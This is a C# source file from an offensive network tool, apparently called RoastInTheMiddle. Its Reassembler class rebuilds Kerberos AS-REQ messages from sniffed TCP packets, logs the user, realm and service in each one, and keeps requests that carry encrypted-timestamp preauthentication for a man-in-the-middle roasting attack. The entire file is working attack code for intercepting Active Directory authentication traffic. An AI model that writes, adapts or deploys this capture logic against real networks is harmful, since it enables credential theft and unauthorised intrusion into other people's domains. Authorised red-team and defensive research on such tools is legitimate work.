using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using PacketDotNet;
using SharpPcap;
using RoastInTheMiddle.Lib.Krb;

namespace RoastInTheMiddle.Lib
{
    public class Reassembler
    {
        private static ILiveDevice captureDevice { get; set; }

        public static void Reassemble()
        {
            if (Program.shared["capture_device"] == null)
            {
                throw new Exception("Capture device not connected!");
            }

            captureDevice = (ILiveDevice)Program.shared["capture_device"];

            while (Program.isRunning)
            {
                try
                {
                    var reassemble = (Dictionary<string, SortedDictionary<uint, EthernetPacket>>)Program.shared["reassemble"];
                    List<string> remove = new List<string>();
                    foreach (var key in reassemble.Keys)
                    {
                        byte[] recordData = null;
                        int recordSize = 0;
                        int position = 0;
                        EthernetPacket firstEthPacket = null;
                        uint lastSize = 0;
                        foreach (var packet in reassemble[key])
                        {
                            byte[] data = null;
                            try
                            {
                                var ethPacket = packet.Value;
                                if (firstEthPacket == null)
                                {
                                    firstEthPacket = ethPacket;
                                }
                                var ipPacket = ethPacket.Extract<IPPacket>();
                                var tcpPacket = ipPacket.Extract<TcpPacket>();
                                byte[] packetData = tcpPacket.PayloadData;
                                if (recordData == null)
                                {
                                    BinaryReader br = new BinaryReader(new MemoryStream(packetData));

                                    int recordMark = IPAddress.NetworkToHostOrder(br.ReadInt32());
                                    recordSize = recordMark & 0x7fffffff;

                                    recordData = new byte[recordSize];

                                    if (packetData.Length > 4)
                                    {
                                        data = br.ReadBytes(packetData.Length - 4);
                                    }
                                }
                                else
                                {
                                    data = packetData;
                                }
                                Buffer.BlockCopy(data, 0, recordData, position, data.Length);
                                position += data.Length;
                                lastSize = (uint)data.Length;
                            }
                            catch (Exception ex)
                            {
                                if (Program.verbose)
                                {
                                    Console.WriteLine($"[!]   POISONIER: MORE ERROR: {ex.Message}\n{ex.StackTrace}\n\n");
                                }
                            }
                        }

                        if (recordSize == recordData.Length)
                        {
                            try
                            {
                                AS_REQ asReq = new AS_REQ(recordData);

                                Console.WriteLine($"[*]   SNIFFER: Got AS-REQ for user {string.Join("@", asReq.req_body.cname.name_string)}@{asReq.req_body.realm} to service {string.Join("/", asReq.req_body.sname.name_string)}");

                                // only use AS-REQ's with preauth, accounts without preauth don't require MitM
                                foreach (var padata in asReq.padata)
                                {
                                    if (padata.type is Interop.PADATA_TYPE.ENC_TIMESTAMP)
                                    {
                                        Program.shared["captured"] = asReq;
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                if (Program.verbose)
                                {
                                    Console.WriteLine($"[!]   POISONIER: SEND ERROR: {ex.Message}\n{ex.StackTrace}\n\n");
                                }
                            }
                            remove.Add(key);
                        }
                    }
                    foreach (string key in remove)
                    {
                        ((Dictionary<string, SortedDictionary<uint, EthernetPacket>>)Program.shared["reassemble"]).Remove(key);
                    }
                }
                catch (Exception ex)
                {
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[!]   POISONIER: Error: {ex.Message}\n{ex.StackTrace}\n\n");
                    }
                }
                Thread.Sleep(10);
            }
        }
    }
}
